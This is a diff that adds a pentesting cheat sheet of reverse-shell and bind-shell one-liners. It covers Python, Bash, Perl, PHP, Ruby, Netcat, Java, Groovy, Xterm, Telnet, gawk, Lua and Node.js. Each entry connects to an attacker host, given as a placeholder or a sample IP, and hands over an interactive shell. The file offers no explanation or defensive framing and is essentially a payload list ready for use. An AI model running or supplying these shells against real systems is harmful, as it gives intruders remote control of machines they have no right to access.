@@ -1,0 +1,122 @@
+SHELLS & REVERSE SHELLS
+
+Python
+	Reverse
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+
+exec 5<>/dev/tcp/attackerip/4444
+cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+
+
+
+Perl
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+Netcat
+nc -e /bin/sh 10.0.0.1 1234
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+nc -c /bin/sh attackerip 4444
+
+/bin/sh | nc attackerip 4444
+
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+
+mknod backpipe p && nc 192.168.1.1 4444 0<backpipe | /bin/bash 1>backpipe
+
+Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+Groovy
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+Xterm
+	Target
+xterm -display 10.0.0.1:1
+
+$ DISPLAY=attackerip:0 xterm
+	Host
+Xnest :1
+xhost +targetip
+
+Telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
+mknod backpipe p && telnet 192.168.1.1 4444 0<backpipe | /bin/bash 1>backpipe
+
+telnet 127.0.0.1 4444 | /bin/bash | telnet 127.0.0.1 4445
+nc -lvp 4444
+nc -nvvlp 4445
+
+AWK/GAWK
+#!/usr/bin/gawk -f
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd> "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |& Service
+                        Service |& getline cmd
+                        if (cmd) {
+                                while ((cmd |& getline) > 0)
+                                        print $0 |& Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
+
+Lua
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+	-linux
+lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+	-*nix and win
+
+NodJS
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "10.17.26.64", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
